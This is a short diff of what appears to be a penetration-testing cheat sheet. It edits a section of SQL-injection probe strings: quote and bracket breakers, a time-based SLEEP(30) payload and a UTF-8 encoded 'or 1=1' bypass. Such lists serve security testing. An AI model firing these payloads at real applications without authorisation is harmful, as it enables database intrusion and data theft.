@@ -115,10 +115,8 @@ http://192.168.1.1/admin
 
 ==> SQL-injection:
 '
-'-- -
-')-- -
-")-- -
 )'
+))'
 "
 `
 ')
@@ -127,9 +125,7 @@ http://192.168.1.1/admin
 '))
 "))
 `))
-
-'-SLEEP(30); #
-
+'-SLEEP(30);
 
 == UTF-8 encoding
 %EF%BC%87 or %EF%BC%87 1 %EF%BC%87 = %EF%BC%87 1
